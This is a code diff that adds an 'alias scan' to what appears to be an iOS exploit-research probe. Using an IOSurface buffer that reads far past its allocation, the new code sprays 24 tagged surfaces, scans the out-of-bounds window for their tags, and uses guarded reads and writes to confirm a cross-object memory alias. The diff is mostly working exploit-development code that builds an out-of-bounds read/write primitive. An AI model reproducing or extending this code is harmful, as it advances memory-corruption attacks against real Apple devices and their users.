@@ -794,7 +794,182 @@ static void va_section(IOSurfaceRef f1) {
     L(@"[VA] === region probe done ===");
 }
 
+// ---- XA: alias scan across F1's over-read window ----
+// The 64 KiB F1 allocation reads cleanly roughly 8 MiB past its end. That window
+// is either a private over-map (padding) or a linear IOSurface heap. Fill 24 fresh
+// surfaces with unique 32-bit tags, look for the tags past F1's alloc, then
+// resolve any hit with a two-way write: store through the victim's own pointer and
+// read back through F1's window, then the reverse. A confirmed pair means the
+// window is live object memory, not padding. Every touch goes through a fault
+// guard because a hit is only known readable, never known writable.
+
+enum { kXaVictims = 24 };
+static const uint64_t kXaScanLimit = 0x800000ULL;
+
+typedef struct {
+    IOSurfaceRef srf;
+    uint8_t *base;
+    size_t alloc;
+    uint32_t tag;
+} xa_victim_t;
+
+static int xa_get32(volatile uint32_t *p, uint32_t *out) {
+    if (sigsetjmp(g_probe_jb, 1) != 0) return 0;
+    g_probe_live = 1;
+    uint32_t v = *p;
+    g_probe_live = 0;
+    *out = v;
+    return 1;
+}
+
+static int xa_put32(volatile uint32_t *p, uint32_t val, uint32_t *oldOut) {
+    if (sigsetjmp(g_probe_jb, 1) != 0) return 0;
+    g_probe_live = 1;
+    uint32_t old = *p;
+    *p = val;
+    __asm__ __volatile__("dmb ish" ::: "memory");
+    g_probe_live = 0;
+    if (oldOut) *oldOut = old;
+    return 1;
+}
+
+static void xa_alias_probe(uint8_t *fb, xa_victim_t *v, int idx, uint64_t off) {
+    volatile uint32_t *viaF1 = (volatile uint32_t *)(fb + off);
+    volatile uint32_t *viaOwn = (volatile uint32_t *)v[idx].base;
+    uint32_t tag = v[idx].tag;
+    uint32_t a = 0, b = 0;
+
+    if (!xa_get32(viaF1, &a) || !xa_get32(viaOwn, &b)) {
+        L(@"[XA] probe unreadable off=0x%llx owner=%d", off, idx);
+        return;
+    }
+    L(@"[XA] probe off=0x%llx owner=%d viaF1=0x%08x viaOwn=0x%08x tag=0x%08x",
+      off, idx, a, b, tag);
+    if (a != tag || b != tag) {
+        L(@"[XA] probe skipped: tag mismatch, refusing to write");
+        return;
+    }
+
+    // Non-destructive identity check: 16 adjacent words through both windows.
+    int same = 0;
+    for (int i = 0; i < 16; i++) {
+        uint32_t x = 0, y = 0;
+        if (!xa_get32(viaF1 + i, &x)) break;
+        if (!xa_get32(viaOwn + i, &y)) break;
+        if (x != y) break;
+        same++;
+    }
+    L(@"[XA] probe window match=%d/16", same);
+
+    uint32_t saved = 0;
+    if (!xa_put32(viaOwn, 0xC0FFEE01u, &saved)) {
+        L(@"[XA] probe owner not writable");
+        return;
+    }
+    uint32_t seenOwnerToF1 = 0;
+    int okOwnerToF1 = xa_get32(viaF1, &seenOwnerToF1) && (seenOwnerToF1 == 0xC0FFEE01u);
+
+    int wroteF1 = xa_put32(viaF1, 0xC0FFEE02u, NULL);
+    uint32_t seenF1ToOwner = 0;
+    int okF1ToOwner = wroteF1 && xa_get32(viaOwn, &seenF1ToOwner)
+                              && (seenF1ToOwner == 0xC0FFEE02u);
+
+    xa_put32(viaOwn, saved, NULL);
+    __asm__ __volatile__("dmb ish" ::: "memory");
+
+    L(@"[XA] write owner->f1 seen=0x%08x %s", seenOwnerToF1,
+      okOwnerToF1 ? "CONFIRMED" : "no");
+    L(@"[XA] write f1->owner wrote=%d seen=0x%08x %s", wroteF1, seenF1ToOwner,
+      okF1ToOwner ? "CONFIRMED" : "no");
+    if (okOwnerToF1 || okF1ToOwner)
+        L(@"[XA] *** CROSS-OBJECT ALIAS *** off=0x%llx owner=%d", off, idx);
+}
+
+static void xa_section(IOSurfaceRef f1) {
+    L(@"[XA] === alias scan ===");
+    if (probe_install() != 0) { L(@"[XA] sigaction failed"); return; }
+
+    uint8_t *fb = (uint8_t *)IOSurfaceGetBaseAddress(f1);
+    if (!fb) { L(@"[XA] no F1 base"); return; }
+    uint64_t f1a = (uint64_t)fb;
+    uint64_t alloc = (uint64_t)IOSurfaceGetAllocSize(f1);
+    L(@"[XA] F1 base=0x%llx alloc=0x%llx limit=0x%llx", f1a, alloc, kXaScanLimit);
+
+    static xa_victim_t v[kXaVictims];
+    int vc = 0;
+    for (int i = 0; i < kXaVictims; i++) {
+        NSDictionary *props = @{
+            (id)kIOSurfaceWidth: @64,
+            (id)kIOSurfaceHeight: @64,
+            (id)kIOSurfaceBytesPerElement: @4,
+            (id)kIOSurfacePixelFormat: @0x42475241
+        };
+        IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)props);
+        if (!s) break;
+        uint8_t *b = (uint8_t *)IOSurfaceGetBaseAddress(s);
+        size_t asz = IOSurfaceGetAllocSize(s);
+        if (!b || asz < 0x1000) { CFRelease(s); break; }
+        uint32_t tag = 0x13370000u + (uint32_t)i;
+        IOSurfaceLock(s, 0, NULL);
+        volatile uint32_t *w = (volatile uint32_t *)b;
+        for (size_t o = 0; o + 4 <= asz; o += 4) w[o >> 2] = tag;
+        IOSurfaceUnlock(s, 0, NULL);
+        v[vc].srf = s;
+        v[vc].base = b;
+        v[vc].alloc = asz;
+        v[vc].tag = tag;
+        L(@"[XA] V%d base=0x%llx alloc=0x%zx delta=0x%llx tag=0x%08x",
+          i, (uint64_t)b, asz, (uint64_t)b - f1a, tag);
+        vc++;
+    }
+    L(@"[XA] victims=%d", vc);
+    if (!vc) return;
+
+    uint64_t firstHit[kXaVictims];
+    uint64_t hitCount[kXaVictims];
+    for (int i = 0; i < kXaVictims; i++) { firstHit[i] = 0; hitCount[i] = 0; }
+
+    uint64_t scanned = 0;
+    for (uint64_t off = 0; off + 0x1000 <= kXaScanLimit; off += 0x1000) {
+        if (!probe_read1(fb + off, NULL)) {
+            L(@"[XA] fault at=0x%llx", off);
+            break;
+        }
+        const uint32_t *w = (const uint32_t *)(fb + off);
+        for (int k = 0; k < 1024; k++) {
+            uint32_t val = w[k];
+            if ((val & 0xFFFF0000u) != 0x13370000u) continue;
+            int idx = (int)(val & 0xFFFFu);
+            if (idx >= vc) continue;
+            uint64_t at = off + (uint64_t)k * 4ULL;
+            if (at < alloc) continue;
+            if (!hitCount[idx]) firstHit[idx] = at;
+            hitCount[idx]++;
+        }
+        scanned = off + 0x1000;
+    }
+    L(@"[XA] scanEnd at=0x%llx", scanned);
+
+    int best = -1;
+    int ownersHit = 0;
+    for (int i = 0; i < vc; i++) {
+        if (!hitCount[i]) continue;
+        ownersHit++;
+        L(@"[XA] owner=%d firstOff=0x%llx count=%llu alloc=0x%zx",
+          i, firstHit[i], (unsigned long long)hitCount[i], v[i].alloc);
+        if (best < 0 || firstHit[i] < firstHit[best]) best = i;
+    }
+    L(@"[XA] ownersHit=%d", ownersHit);
+
+    if (best >= 0) xa_alias_probe(fb, v, best, firstHit[best]);
+    else L(@"[XA] no tagged surface inside F1 window");
+
+    for (int i = 0; i < vc; i++) CFRelease(v[i].srf);
+    L(@"[XA] === alias scan done ===");
+}
+
 // ---- resume-driven geometry sweep ----
+
 // fork() is refused inside the app sandbox (EPERM, errno 1), so the points run
 // inline. Progress lives on disk: the index is written *before* a point runs, so
 // a point that kills the process is skipped on the next launch, and the killer is
@@ -1002,6 +1177,8 @@ static void run(void) {
     mapping_probe(surf);
 
     va_section(surf);
+
+    xa_section(surf);
 
     gd_sweep();
 
